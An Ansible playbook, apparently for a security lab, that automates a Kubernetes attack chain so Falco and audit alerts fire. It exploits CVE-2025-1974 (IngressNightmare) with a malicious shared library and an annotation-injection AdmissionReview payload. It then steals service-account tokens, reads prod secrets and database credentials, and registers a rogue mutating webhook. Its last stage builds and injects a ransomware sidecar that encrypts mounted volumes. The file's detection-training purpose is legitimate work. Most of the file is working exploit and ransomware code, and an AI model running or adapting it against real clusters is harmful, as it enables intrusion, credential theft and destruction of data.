- name: Set flavor-specific commands and variables
  ansible.builtin.set_fact:
    _kubectl: "{{ 'microk8s kubectl' if k8s_flavor | default('microk8s') == 'microk8s' else 'kubectl' }}"
    _ctr: "{{ 'microk8s ctr' if k8s_flavor | default('microk8s') == 'microk8s' else 'ctr -n k8s.io' }}"
    _k8s_api_port: "{{ '16443' if k8s_flavor | default('microk8s') == 'microk8s' else '6443' }}"

---
# ==============================================================
# Pre-flight — wait for all prerequisites before attack begins
# ==============================================================

- name: "Pre-flight — Wait for ingress-nginx controller to be ready"
  become: true
  become_user: "{{ k8s_user }}"
  ansible.builtin.command:
    cmd: >
      {{ _kubectl }} rollout status deployment/ingress-nginx-controller
      -n {{ vuln_ingress_namespace }} --timeout=120s
  changed_when: false

- name: "Pre-flight — Wait for postgres pod to be ready"
  become: true
  become_user: "{{ k8s_user }}"
  ansible.builtin.command:
    cmd: >
      {{ _kubectl }} wait pod/postgres -n prod
      --for=condition=Ready --timeout=120s
  changed_when: false

- name: "Pre-flight — Wait for ransomware webhook pod to be ready"
  become: true
  become_user: "{{ k8s_user }}"
  ansible.builtin.command:
    cmd: >
      {{ _kubectl }} wait pod/ransomware-webhook -n default
      --for=condition=Ready --timeout=120s
  changed_when: false

- name: "Pre-flight — Wait for Falco to be ready"
  become: true
  become_user: "{{ k8s_user }}"
  ansible.builtin.command:
    cmd: >
      {{ _kubectl }} rollout status daemonset/falco
      -n {{ falco_namespace }} --timeout=300s
  changed_when: false

- name: "Pre-flight — Wait for Falcosidekick to be ready"
  become: true
  become_user: "{{ k8s_user }}"
  ansible.builtin.command:
    cmd: >
      {{ _kubectl }} rollout status deployment/falcosidekick
      -n {{ falco_namespace }} --timeout=120s
  changed_when: false

- name: "Pre-flight — Wait for Loki to be ready"
  become: true
  become_user: "{{ k8s_user }}"
  ansible.builtin.command:
    cmd: >
      {{ _kubectl }} rollout status statefulset/loki
      -n {{ grafana_namespace }} --timeout=120s
  changed_when: false

- name: "Pre-flight — Confirm Falcosidekick can reach Loki"
  become: true
  become_user: "{{ k8s_user }}"
  ansible.builtin.command:
    cmd: >
      {{ _kubectl }} run loki-probe --rm -i --restart=Never
      --image=curlimages/curl -n {{ falco_namespace }}
      -- curl -sf http://loki.{{ grafana_namespace }}.svc.cluster.local:3100/ready
  changed_when: false

# ==============================================================
# Attack Step 1 — NodePort enumeration
# Generates initial network connection artifacts visible in Falco
# ==============================================================

- name: "Step 1 — Install nmap"
  become: true
  ansible.builtin.apt:
    name: nmap
    state: present
    update_cache: false

- name: "Step 1 — Scan NodePort range for open services"
  become: true
  become_user: "{{ k8s_user }}"
  ansible.builtin.command:
    cmd: nmap -sT -p {{ attacker_nodeport_start }}-{{ attacker_nodeport_end }} --open 127.0.0.1
  register: _nodeport_scan
  changed_when: false

- name: "Step 1 — Log NodePort scan results"
  ansible.builtin.debug:
    msg: "{{ _nodeport_scan.stdout_lines }}"


# ==============================================================
# Attack Step 2 — CVE-2025-1974 (IngressNightmare) exploitation
#
# Technique:
#   1. Compile a shared library whose constructor writes a marker file
#   2. Stage the .so inside the ingress-nginx pod via base64+pipe
#      (simulates the client body buffer / procfs fd staging in the
#      real exploit the admission controller is the Go binary, not
#      nginx itself, so the /proc/self/fd trick targets the nginx
#      worker process that was already running; for the lab we stage
#      the file directly to keep the focus on the annotation injection)
#   3. Send an anonymous AdmissionReview to the exposed NodePort with
#      a server-snippet annotation that escapes the server{} and http{}
#      config blocks and injects ssl_engine pointing to the staged .so
#   4. The admission controller runs nginx -t; ssl_engine triggers
#      dlopen() which fires the constructor before config validation fails
# ==============================================================

- name: "Step 2 — Retrieve ingress-nginx controller pod name"
  become: true
  become_user: "{{ k8s_user }}"
  ansible.builtin.command:
    cmd: >
      {{ _kubectl }} get pod -n {{ vuln_ingress_namespace }}
      -l app.kubernetes.io/name=ingress-nginx,app.kubernetes.io/component=controller
      -o jsonpath='{.items[0].metadata.name}'
  register: _ingress_pod_name
  changed_when: false

- name: "Step 2 — Install exploit dependencies"
  become: true
  ansible.builtin.apt:
    pkg:
      - gcc
      - libssl-dev
      - python3-requests
    state: present
    update_cache: false

- name: "Step 2 — Create PoC working directory"
  ansible.builtin.file:
    path: /tmp/ingress-nightmare-poc
    state: directory
    mode: '0755'

- name: "Step 2 — Download exploit.py (hakaioffsec/IngressNightmare-PoC)"
  ansible.builtin.get_url:
    url: "https://raw.githubusercontent.com/hakaioffsec/IngressNightmare-PoC/main/exploit.py"
    dest: /tmp/ingress-nightmare-poc/exploit.py
    mode: '0755'
    force: true

- name: "Step 2 — Write custom lib_template.c (marker + SA token exfil, no reverse shell)"
  # exploit.py does str.replace("HOST", host) and str.replace("PORT", port) before
  # compiling. The placeholders are kept as unused static variables so the substitution
  # produces valid C; the actual payload writes the RCE marker and copies the SA token
  # to /tmp/stolen-token for Step 3 to consume via kubectl exec.
  ansible.builtin.copy:
    dest: /tmp/ingress-nightmare-poc/lib_template.c
    mode: '0644'
    content: |
      #include <stdlib.h>

      /* HOST / PORT kept for exploit.py template substitution — not used */
      static const char *_cb_host __attribute__((unused)) = "HOST";
      static int _cb_port __attribute__((unused)) = PORT;

      __attribute__((constructor))
      void run_on_load() {
          system("echo CVE-2025-1974-RCE-CONFIRMED > {{ attacker_exploit_marker }} 2>&1");
          system("cp {{ ingress_sa_token_path }} /tmp/stolen-token 2>/dev/null");
      }

      int bind(void *e, const char *id) { return 1; }
      void ENGINE_load_evil() {}
      int bind_engine() { return 1; }

- name: "Step 2 — Write review.json (auth-tls-match-cn ssl_engine injection)"
  # Uses the auth-tls-match-cn annotation vector. The value injects
  # ssl_engine ../../../../../../REPLACE; into the generated nginx config.
  # exploit.py brute-forces REPLACE = /proc/<pid>/fd/<n> until dlopen() fires
  # the library constructor inside the admission controller process.
  ansible.builtin.copy:
    dest: /tmp/ingress-nightmare-poc/review.json
    mode: '0644'
    content: |
      {
        "kind": "AdmissionReview",
        "apiVersion": "admission.k8s.io/v1",
        "request": {
          "uid": "e166d137-ff47-443f-9108-9eb42e9738e8",
          "kind": {"group": "networking.k8s.io", "version": "v1", "kind": "Ingress"},
          "resource": {"group": "networking.k8s.io", "version": "v1", "resource": "ingresses"},
          "requestKind": {"group": "networking.k8s.io", "version": "v1", "kind": "Ingress"},
          "requestResource": {"group": "networking.k8s.io", "version": "v1", "resource": "ingresses"},
          "name": "exploit", "namespace": "default", "operation": "CREATE",
          "userInfo": {"username": "kube-review", "uid": "0e484028-0d13-4d6a-9267-92e4a5e2c801"},
          "object": {
            "kind": "Ingress", "apiVersion": "networking.k8s.io/v1",
            "metadata": {
              "name": "exploit", "namespace": "default",
              "annotations": {
                "nginx.ingress.kubernetes.io/auth-tls-match-cn": "CN=abc #(\n){}\n }}\nssl_engine ../../../../../../REPLACE;\n#",
                "nginx.ingress.kubernetes.io/auth-tls-secret": "{{ vuln_ingress_namespace }}/ingress-nginx-admission",
                "nginx.ingress.kubernetes.io/backend-protocol": "FCGI"
              }
            },
            "spec": {"rules": [{"host": "exploit.local", "http": {"paths": [
              {"path": "/", "pathType": "Prefix",
               "backend": {"service": {"name": "svc", "port": {"number": 80}}}}
            ]}}]},
            "status": {"loadBalancer": {}}
          },
          "oldObject": null, "dryRun": true,
          "options": {"kind": "CreateOptions", "apiVersion": "meta.k8s.io/v1"}
        }
      }

- name: "Step 2 — Execute CVE-2025-1974 exploit (hakaioffsec/IngressNightmare-PoC)"
  # Stages evil_engine.so to the ingress HTTP NodePort with inflated Content-Length
  # (real mechanism: nginx worker holds the body buffer FD open). Brute-forces
  # /proc/<pid>/fd/<n> against the unauthenticated admission webhook NodePort until
  # dlopen() fires the library constructor.
  # 127.0.0.1:9999 is a dummy rev-shell target — payload writes files instead.
  # k8saudit: high volume of anonymous AdmissionReview requests (brute-force)
  become: true
  become_user: "{{ k8s_user }}"
  ansible.builtin.command:
    cmd: >
      python3 exploit.py
      http://127.0.0.1:{{ vuln_ingress_http_nodeport }}/
      https://127.0.0.1:{{ vuln_ingress_webhook_nodeport }}
      127.0.0.1:9999
    chdir: /tmp/ingress-nightmare-poc
  register: _exploit_output
  changed_when: true

- name: "Step 2 — Log exploit output"
  ansible.builtin.debug:
    msg: "{{ _exploit_output.stdout_lines }}"

- name: "Step 2 — Confirm RCE: verify marker file inside ingress-nginx pod"
  become: true
  become_user: "{{ k8s_user }}"
  ansible.builtin.command:
    cmd: {{ _kubectl }} exec -n {{ vuln_ingress_namespace }} {{ _ingress_pod_name.stdout }} -- cat {{ attacker_exploit_marker }}
  register: _rce_confirmation
  changed_when: false
  retries: 5
  delay: 5
  until: _rce_confirmation.rc == 0

- name: "Step 2 — Log RCE confirmation"
  ansible.builtin.debug:
    msg: "RCE confirmed: {{ _rce_confirmation.stdout }}"


# ==============================================================
# Attack Step 3 — Service account token theft
# Simulates attacker executing commands inside the compromised pod
# ==============================================================

- name: "Step 3 — Read SA token exfiltrated by exploit payload"
  # The library constructor copied the SA token to /tmp/stolen-token during RCE.
  # kubectl exec here generates k8saudit telemetry (exec into pod).
  become: true
  become_user: "{{ k8s_user }}"
  ansible.builtin.command:
    cmd: {{ _kubectl }} exec -n {{ vuln_ingress_namespace }} {{ _ingress_pod_name.stdout }} -- cat /tmp/stolen-token
  register: _stolen_ingress_token
  changed_when: false
  retries: 5
  delay: 5
  until: _stolen_ingress_token.rc == 0

- name: "Step 3 — Store stolen ingress-nginx token"
  ansible.builtin.set_fact:
    _stolen_ingress_token_value: "{{ _stolen_ingress_token.stdout | trim }}"

- name: "Step 3 — Enumerate permissions with stolen ingress-nginx token"
  become: true
  become_user: "{{ k8s_user }}"
  ansible.builtin.command:
    cmd: >
      {{ _kubectl }} auth can-i --list
      --server https://{{ ansible_host }}:{{ _k8s_api_port }}
      --token {{ _stolen_ingress_token_value }}
      --insecure-skip-tls-verify
  register: _ingress_perms
  changed_when: false

- name: "Step 3 — Log permission enumeration results"
  ansible.builtin.debug:
    msg: "{{ _ingress_perms.stdout_lines }}"


# ==============================================================
# Attack Step 4 — Cross-namespace secret read
# ==============================================================

- name: "Step 4 — Read prod-app-config secret using stolen ingress-nginx token"
  # k8saudit: secret get in prod namespace by ingress-nginx service account — high signal alert
  become: true
  become_user: "{{ k8s_user }}"
  ansible.builtin.command:
    cmd: >
      {{ _kubectl }} get secret {{ prod_app_secret_name }} -n prod
      --server https://{{ ansible_host }}:{{ _k8s_api_port }}
      --token {{ _stolen_ingress_token_value }}
      --insecure-skip-tls-verify
      -o json
  register: _stolen_prod_secret
  changed_when: false

- name: "Step 4 — Extract credentials from stolen secret"
  ansible.builtin.set_fact:
    _stolen_db_user:          "{{ (_stolen_prod_secret.stdout | from_json).data.db_username | b64decode }}"
    _stolen_db_password:      "{{ (_stolen_prod_secret.stdout | from_json).data.db_password | b64decode }}"
    _stolen_prod_cicd_token:  "{{ (_stolen_prod_secret.stdout | from_json).data.service_account_token | b64decode }}"

- name: "Step 4 — Log stolen credential summary"
  ansible.builtin.debug:
    msg:
      - "DB user:  {{ _stolen_db_user }}"
      - "prod-cicd token (first 40 chars): {{ _stolen_prod_cicd_token[:40] }}"


# ==============================================================
# Attack Step 5 — Database connection from outside prod namespace
# Simulates lateral movement: ingress-nginx namespace → prod DB
# ==============================================================

- name: "Step 5 — Retrieve prod PostgreSQL ClusterIP"
  become: true
  become_user: "{{ k8s_user }}"
  ansible.builtin.command:
    cmd: {{ _kubectl }} get svc postgres -n prod -o jsonpath='{.spec.clusterIP}'
  register: _postgres_clusterip
  changed_when: false

- name: "Step 5 — Launch postgres client pod in ingress-nginx namespace"
  # Falco: unexpected outbound connection from ingress-nginx pod to prod DB service IP
  become: true
  become_user: "{{ k8s_user }}"
  ansible.builtin.command:
    cmd: >
      {{ _kubectl }} run db-probe
      --image=postgres:15
      --restart=Never
      --namespace={{ vuln_ingress_namespace }}
      --env=PGPASSWORD={{ _stolen_db_password }}
      --command
      -- psql
      -h {{ _postgres_clusterip.stdout }}
      -U {{ _stolen_db_user }}
      -d {{ prod_db_name }}
      -c "SELECT version();"
  changed_when: true

- name: "Step 5 — Wait for db-probe pod to complete"
  become: true
  become_user: "{{ k8s_user }}"
  ansible.builtin.command:
    cmd: {{ _kubectl }} wait pod/db-probe -n {{ vuln_ingress_namespace }} --for=condition=Ready --timeout=60s
  changed_when: false
  failed_when: false

- name: "Step 5 — Retrieve db-probe query output"
  become: true
  become_user: "{{ k8s_user }}"
  ansible.builtin.command:
    cmd: {{ _kubectl }} logs db-probe -n {{ vuln_ingress_namespace }}
  register: _db_query_result
  changed_when: false
  retries: 6
  delay: 5
  until: _db_query_result.rc == 0 and _db_query_result.stdout != ""

- name: "Step 5 — Log DB query result"
  ansible.builtin.debug:
    msg: "{{ _db_query_result.stdout_lines }}"

- name: "Step 5 — Delete db-probe pod"
  become: true
  become_user: "{{ k8s_user }}"
  ansible.builtin.command:
    cmd: {{ _kubectl }} delete pod db-probe -n {{ vuln_ingress_namespace }} --ignore-not-found=true
  changed_when: true


# ==============================================================
# Attack Step 6 — Register malicious MutatingWebhookConfiguration
# Uses the stolen prod-cicd token — not cluster-admin kubeconfig
# ==============================================================

- name: "Step 6 — Write ransomware MutatingWebhookConfiguration manifest"
  ansible.builtin.copy:
    dest: /tmp/ransomware-webhook.yaml
    mode: '0644'
    content: |
      apiVersion: admissionregistration.k8s.io/v1
      kind: MutatingWebhookConfiguration
      metadata:
        name: {{ ransomware_webhook_name }}
      webhooks:
        - name: inject.ransomware.io
          admissionReviewVersions: ["v1"]
          sideEffects: None
          failurePolicy: Ignore
          clientConfig:
            service:
              name: ransomware-webhook
              namespace: {{ ransomware_webhook_namespace }}
              path: /mutate
            caBundle: {{ _ransomware_webhook_cabundle.stdout }}
          rules:
            - operations: ["CREATE"]
              apiGroups: [""]
              apiVersions: ["v1"]
              resources: ["pods"]
          namespaceSelector:
            matchLabels:
              environment: prod

- name: "Step 6 — Delete ransomware MutatingWebhookConfiguration if already present (idempotency)"
  become: true
  become_user: "{{ k8s_user }}"
  ansible.builtin.command:
    cmd: {{ _kubectl }} delete mutatingwebhookconfiguration {{ ransomware_webhook_name }} --ignore-not-found=true
  changed_when: false

- name: "Step 6 — Register ransomware MutatingWebhookConfiguration using prod-cicd token"
  # k8saudit: MutatingWebhookConfiguration created by prod-cicd service account — smoking gun alert
  # Uses kubectl create (not apply) because prod-cicd ClusterRole only grants `create` (not `get`).
  # kubectl apply does a GET first → 403; kubectl create only does a POST → succeeds.
  become: true
  become_user: "{{ k8s_user }}"
  ansible.builtin.command:
    cmd: >
      {{ _kubectl }} create -f /tmp/ransomware-webhook.yaml
      --server https://{{ ansible_host }}:{{ _k8s_api_port }}
      --token {{ _stolen_prod_cicd_token }}
      --insecure-skip-tls-verify
  changed_when: true


# ==============================================================
# Attack Step 7 — Build ransomware sidecar image locally
# prerequisite: image must be built before rollout restart in step 8
# ==============================================================

- name: "Step 7 — Create build directory for ransomware sidecar"
  ansible.builtin.file:
    path: "{{ ransomware_dockerfile_dest }}"
    state: directory
    mode: '0755'

- name: "Step 7 — Write ransomware sidecar Dockerfile"
  ansible.builtin.copy:
    dest: "{{ ransomware_dockerfile_dest }}/Dockerfile"
    mode: '0644'
    content: |
      FROM python:3.11-slim
      RUN pip install --no-cache-dir cryptography
      COPY encrypt.py /encrypt.py
      CMD ["python", "/encrypt.py"]

- name: "Step 7 — Write ransomware encryption script"
  ansible.builtin.copy:
    dest: "{{ ransomware_dockerfile_dest }}/encrypt.py"
    mode: '0644'
    content: |
      import os, glob
      from cryptography.fernet import Fernet

      KEY = b"{{ ransomware_fernet_key }}"
      fernet = Fernet(KEY)

      for vol_root in glob.glob('/mnt/*'):
          if not os.path.isdir(vol_root):
              continue
          for dirpath, _dirs, filenames in os.walk(vol_root):
              for filename in filenames:
                  if filename == 'RANSOM.txt':
                      continue
                  filepath = os.path.join(dirpath, filename)
                  try:
                      with open(filepath, 'rb') as f:
                          data = f.read()
                      with open(filepath, 'wb') as f:
                          f.write(fernet.encrypt(data))
                  except Exception:
                      pass
          try:
              with open(os.path.join(vol_root, 'RANSOM.txt'), 'w') as f:
                  f.write(
                      "YOUR DATA HAS BEEN ENCRYPTED.\n"
                      "This is a security lab simulation.\n"
                  )
          except Exception:
              pass

      print("Encryption complete")
      # Sleep indefinitely so the container stays Running (pod restartPolicy is Always).
      import time
      while True:
          time.sleep(3600)

- name: "Step 7 — Build ransomware sidecar image"
  become: true
  become_user: "{{ k8s_user }}"
  ansible.builtin.command:
    cmd: podman build -t {{ ransomware_image }} {{ ransomware_dockerfile_dest }}
  changed_when: true

- name: "Step 7 — Import ransomware image into MicroK8s containerd"
  become: true
  become_user: "{{ k8s_user }}"
  ansible.builtin.shell:
    cmd: podman save {{ ransomware_image }} | {{ _ctr }} images import -
  changed_when: true

- name: "Step 7 — Tag ransomware image with docker.io alias for containerd checkpoint check"
  # containerd's checkpoint-image verification normalises image refs to docker.io/library/<name>
  # even when the pod spec uses localhost/. Adding this alias prevents CreateContainerError.
  # Ignore errors when the tag already exists (idempotent re-runs).
  become: true
  become_user: "{{ k8s_user }}"
  ansible.builtin.command:
    cmd: {{ _ctr }} images tag localhost/ludus-ransomware-sidecar:latest docker.io/library/ludus-ransomware-sidecar:latest
  changed_when: true
  failed_when: false

- name: "Step 7 — Verify ransomware image is available in containerd"
  become: true
  become_user: "{{ k8s_user }}"
  ansible.builtin.command:
    cmd: {{ _ctr }} images ls name~=ransomware-sidecar
  register: _ctr_images
  changed_when: false

- name: "Step 7 — Log containerd ransomware image names"
  ansible.builtin.debug:
    msg: "{{ _ctr_images.stdout_lines }}"


# ==============================================================
# Attack Step 8 — Rollout restart: webhook fires, sidecar injected
# ==============================================================

- name: "Step 8 — Create PVC for prod-app data volume"
  kubernetes.core.k8s:
    kubeconfig: "/home/{{ k8s_user }}/.kube/config"
    state: present
    definition:
      apiVersion: v1
      kind: PersistentVolumeClaim
      metadata:
        name: prod-app-pvc
        namespace: prod
      spec:
        accessModes:
          - ReadWriteOnce
        resources:
          requests:
            storage: 1Gi

- name: "Step 8 — Deploy prod workload (Deployment) to trigger webhook injection"
  # Creates the deployment that will be restarted to inject the sidecar.
  # Recreate strategy avoids two pods mounting the same RWO PVC simultaneously.
  # force: true replaces the object if patching fails (e.g. strategy type change conflict).
  kubernetes.core.k8s:
    kubeconfig: "/home/{{ k8s_user }}/.kube/config"
    state: present
    force: true
    definition:
      apiVersion: apps/v1
      kind: Deployment
      metadata:
        name: prod-app
        namespace: prod
      spec:
        replicas: 1
        strategy:
          type: Recreate
        selector:
          matchLabels:
            app: prod-app
        template:
          metadata:
            labels:
              app: prod-app
          spec:
            containers:
              - name: app
                image: nginx:stable-alpine
                volumeMounts:
                  - name: data
                    mountPath: /usr/share/nginx/html
            volumes:
              - name: data
                persistentVolumeClaim:
                  claimName: prod-app-pvc

- name: "Step 8 — Trigger rollout restart using stolen prod-cicd token"
  # k8saudit: deployment update in prod by prod-cicd — rapid pod deletion/creation cascade follows
  # Falco: unexpected process execution inside prod pods, suspicious volume write activity
  become: true
  become_user: "{{ k8s_user }}"
  ansible.builtin.command:
    cmd: >
      {{ _kubectl }} rollout restart deployment/prod-app -n prod
      --server https://{{ ansible_host }}:{{ _k8s_api_port }}
      --token {{ _stolen_prod_cicd_token }}
      --insecure-skip-tls-verify
  changed_when: true

- name: "Step 8 — Wait for rollout to complete"
  become: true
  become_user: "{{ k8s_user }}"
  ansible.builtin.command:
    cmd: {{ _kubectl }} rollout status deployment/prod-app -n prod --timeout=180s
  changed_when: false
  ignore_errors: true
  register: _rollout_status

- name: "Step 8 — Describe prod-app pod (debug)"
  become: true
  become_user: "{{ k8s_user }}"
  ansible.builtin.shell:
    cmd: {{ _kubectl }} describe pod -n prod -l app=prod-app | tail -60
  register: _pod_describe
  changed_when: false
  ignore_errors: true

- name: "Step 8 — Log prod-app pod description"
  ansible.builtin.debug:
    msg: "{{ _pod_describe.stdout_lines }}"

- name: "Step 8 — Fail if rollout did not complete"
  ansible.builtin.fail:
    msg: "Rollout timed out. See pod description above for root cause."
  when: _rollout_status.rc != 0

- name: "Step 8 — Confirm ransomware sidecar was injected"
  become: true
  become_user: "{{ k8s_user }}"
  ansible.builtin.command:
    cmd: >
      {{ _kubectl }} get pod -n prod
      -l app=prod-app
      -o jsonpath='{.items[0].spec.containers[*].name}'
  register: _pod_containers
  changed_when: false

- name: "Step 8 — Log injected container names"
